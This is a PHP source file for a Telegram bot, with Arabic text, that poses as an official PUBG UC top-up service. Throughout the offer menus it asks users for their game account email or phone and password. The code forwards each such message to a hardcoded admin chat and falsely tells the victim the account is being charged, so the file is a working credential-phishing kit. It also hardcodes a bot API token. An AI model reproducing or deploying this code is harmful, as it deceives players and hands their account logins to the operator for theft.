<?php 
ob_start();
$hhzZz = '1292236609:AAHr68vrNiOxVKA9XouJ5Hq-tVh5nz7eJsQ';
define('API_KEY',$hhzZz);
echo file_get_contents("https://api.telegram.org/bot" . API_KEY . "/setwebhook?url=" . $_SERVER['SERVER_NAME'] . "" . $_SERVER['SCRIPT_NAME']);
function bot($method,$datas=[]){
$hhzkz = http_build_query($datas);
$url = "https://api.telegram.org/bot".API_KEY."/".$method."?$hhzkz";
$hhzkz = file_get_contents($url);
return json_decode($hhzkz);
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$text = $message->text;
$admin = 1010918290;
$id = $message->chat->id;
$message_id2 = $update->callback_query->message->message_id;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$message_id2 = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$name = $update->message->from->first_name;
$from_id = $message->from->id;
if($text && $from_id !== $admin){bot('forwardMessage',[
'chat_id'=>$admin, 'from_chat_id'=>$chat_id, 'message_id'=>$update->message->message_id,
'text'=>$text,]);}
if($text == "/start" ){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
~ اهلا بك عزيزي $name 🌐.
~ في بوت شحن شدات ببجي الرسمي 💸.
~ اضغط على بدء عمليه الشحن واشحن 📨.
"
,'parse_mode'=>"markdown",'disable_web_page_preview'=>true,'reply_markup'=>json_encode(['inline_keyboard'=>[
[['text'=>'~ بدء عمليه الشحن ➕ .','callback_data'=>'ar']],
[['text'=>'~ العروض 🔘.','callback_data'=>'at']],
[['text'=>'~ قناة البوت 💛 .','url'=>'t.me/ThePHPbots']],
],])]);}

if($data == "ar"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ اختر عدد الشدات المناسبه لك 💸.',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'120💸' ,'callback_data'=>"1"]],
[['text'=>'300💸' ,'callback_data'=>"2"]],
[['text'=>'690💸' ,'callback_data'=>"3"]],
[['text'=>'1238💸' ,'callback_data'=>"4"]],
]])
]);
}

if($data == "1"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد الشدات المختاره *120*💸.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
email/phone:pass.
~ وانتظر لحين ينشحن حسآبك من خلال المطور 🆔.',
'parse_mode'=>"Markdown",
]);
}
if($data == "2"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد الشدات المختاره *300*💸.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
email/phone:pass.
~ وانتظر لحين ينشحن حسآبك من خلال المطور 🆔.',
'parse_mode'=>"Markdown",
]);
}
if($data == "3"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد الشدات المختاره *690*💸.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
email/phone:pass.
~ وانتظر لحين ينشحن حسآبك من خلال المطور 🆔.',
'parse_mode'=>"Markdown",
]);
}
if($data == "4"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ حسنا عزيزي تم ٱختيار العدد بنجآح ✅.
~ عدد الشدات المختاره *1238*💸.
~ الان ارسل لنا معلومات حسٱبك بل شكل الاتي 👌🏻.
email/phone:pass.
~ وانتظر لحين ينشحن حسآبك من خلال المطور 🆔.',
'parse_mode'=>"Markdown",
]);
}

if($data == "at"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ آختار العروض التي تعجبك من البوت 🌑.',
 'reply_markup'=>json_encode([ 
      'inline_keyboard'=>[
[['text'=>'~ عرض الامفور الثلجي ❄️ .' ,'callback_data'=>"11"]],
[['text'=>'~ عرض الامفور الجوكر 🚺 .' ,'callback_data'=>"22"]],
[['text'=>'~ عرض شحن الرويل باس 🔱 .' ,'callback_data'=>"33"]],
]])
]);
}

if($data == "11"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ تم اختيآر عرض الامفور الثلجي ❄️.
~ الان ارسل لنا معلوماتك بالشكل الاتي ☂.
~ Email:Pass:Id 🖲.
~ وسيتم بعد مرور 15 دقيقه بٱضافه الامفور الثلجي الى حسابك .',
]);
}
if($data == "22"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ تم اختيآر عرض الجوكر 🚺.
~ الان ارسل معلوماتك بالشكب الاتي 💠.
~ Email:Pass:Id .
~ وسيتم شحن امفور الجوكر الئ حسابك بعد مرور 15 دقيقة .',
]);
}
if($data == "33"){
bot('editMessageText',[
 'chat_id'=>$chat_id2,
 'message_id'=>$message_id,
'text'=>'~ تم اختيآر عرض الرويال بآس 🔱.
~ الان ارسل معلوماتك بالشكل الاتي 🔮.
~ Email:Pass:Id
~ و سيتم شحن الرويال باس الئ حسابك .',
]);
}

if($text !== "/start" ){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم حفظ حسآبك الان انتظر بينما يتم الشحن الك 💸.",
]);
}